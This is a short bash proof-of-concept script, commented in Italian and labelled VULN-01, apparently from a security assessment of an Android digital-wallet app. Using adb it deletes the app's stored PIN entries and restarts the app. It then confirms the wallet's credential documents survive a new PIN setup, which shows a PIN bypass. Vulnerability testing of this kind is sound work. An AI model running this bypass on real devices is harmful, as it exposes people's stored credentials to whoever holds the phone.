#!/bin/bash
# VULN-01: PIN Bypass - Remove PIN without invalidating credentials
source "$(dirname "$0")/00-common.sh"

banner "VULN-01: PIN BYPASS"
check_device

info "Lettura stato attuale..."
BEFORE=$(read_prefs)

if ! echo "$BEFORE" | grep -q "PinEnc"; then
    fail "Nessun PIN impostato. Configura l'app e riprova."
    exit 1
fi

ok "PIN trovato: PinEnc e PinIv presenti"

# Conta documenti prima
$ADB shell "run-as $PKG cat $DOCDB" > /tmp/docdb_before.db 2>/dev/null
DOCS_BEFORE=$(sqlite3 /tmp/docdb_before.db "SELECT COUNT(*) FROM MzDocuments;" 2>/dev/null || echo "0")
info "Documenti nel wallet prima: $DOCS_BEFORE"

info "Rimozione PinEnc e PinIv..."
echo "$BEFORE" | grep -v 'name="PinEnc"' | grep -v 'name="PinIv"' > /tmp/av-nopin.xml
write_prefs /tmp/av-nopin.xml

AFTER=$(read_prefs)
if echo "$AFTER" | grep -q "PinEnc"; then
    fail "PinEnc ancora presente"
    exit 1
fi
ok "PinEnc e PinIv rimossi"

info "Riavvio app..."
restart_app

ok "App riavviata"
info ">>> VERIFICA SULL'EMULATORE: l'app mostra l'onboarding (setup nuovo PIN)"

echo ""
read -p "  Premi INVIO dopo aver impostato un nuovo PIN nell'app... "

# Conta documenti dopo
$ADB shell "run-as $PKG cat $DOCDB" > /tmp/docdb_after.db 2>/dev/null
DOCS_AFTER=$(sqlite3 /tmp/docdb_after.db "SELECT COUNT(*) FROM MzDocuments;" 2>/dev/null || echo "0")
info "Documenti nel wallet dopo: $DOCS_AFTER"

if [ "$DOCS_BEFORE" = "$DOCS_AFTER" ]; then
    ok "CONFERMATO: PIN resettato, credenziali INTATTE ($DOCS_AFTER documenti)"
else
    fail "Conteggio documenti cambiato: $DOCS_BEFORE -> $DOCS_AFTER"
fi

banner "RISULTATO: PIN non legato al vault credenziali"
